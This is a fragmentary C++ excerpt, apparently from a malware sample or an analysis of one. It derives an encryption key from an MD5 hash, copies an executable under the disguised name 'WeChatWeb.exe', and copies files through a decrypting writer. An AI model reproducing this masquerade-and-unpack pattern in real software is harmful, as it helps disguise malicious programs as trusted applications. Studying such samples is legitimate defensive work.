...
unsigned char gkey[CRYPT_KEY_SIZE] = { 0 };
...
void FileOper::getkey(unsigned char * key) {
	...
	CryptoUtils::getDataMd5(szrawkey, lstrlenA(szrawkey), (char*)key, FALSE);
...
int renameExe(string path,string srcfn) {
	...
	dstfilename = path + "WeChatWeb.exe";
	ret = CopyFileA(filename.c_str(), dstfilename.c_str(), 0);
...
int FileOper::fileCopy(string src, string dst) {
	return fileDecryptWriter(src, dst);
}
